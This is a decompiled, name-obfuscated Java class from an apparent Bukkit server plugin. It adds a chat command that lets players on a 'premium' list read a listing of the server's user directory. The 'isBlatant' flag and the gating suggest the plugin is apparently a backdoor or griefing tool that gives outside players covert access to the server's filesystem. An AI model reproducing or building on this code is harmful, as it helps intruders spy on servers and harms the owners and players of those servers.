/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.FileUtil;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class ListCommand
extends Command {
    /* synthetic */ File file;

    @Override
    public boolean isBlatant() {
        return false;
    }

    public ListCommand() {
        ListCommand lllllllllllllllllIIIIlIlllIIIlll;
        lllllllllllllllllIIIIlIlllIIIlll.file = FileUtil.getUserDir();
    }

    @Override
    public void execute(Core lllllllllllllllllIIIIlIllIllIllI, String lllllllllllllllllIIIIlIllIlllIlI, String[] lllllllllllllllllIIIIlIllIlllIIl, Player lllllllllllllllllIIIIlIllIllIlIl) {
        if (lllllllllllllllllIIIIlIllIllIllI.premium.contains(lllllllllllllllllIIIIlIllIllIlIl.getName())) {
            ListCommand lllllllllllllllllIIIIlIllIllIlll;
            ArrayList<String> lllllllllllllllllIIIIlIllIllllIl = new ArrayList<String>();
            for (File lllllllllllllllllIIIIlIllIlllllI : lllllllllllllllllIIIIlIllIllIlll.file.listFiles()) {
                if (lllllllllllllllllIIIIlIllIlllllI.isFile()) {
                    lllllllllllllllllIIIIlIllIllllIl.add(lllllllllllllllllIIIIlIllIlllllI.getName());
                    continue;
                }
                lllllllllllllllllIIIIlIllIllllIl.add(String.valueOf(new StringBuilder().append("/").append(lllllllllllllllllIIIIlIllIlllllI.getName()).append("/")));
            }
            Collections.sort(lllllllllllllllllIIIIlIllIllllIl);
            lllllllllllllllllIIIIlIllIllIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("").append(lllllllllllllllllIIIIlIllIllllIl))));
        } else {
            lllllllllllllllllIIIIlIllIllIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

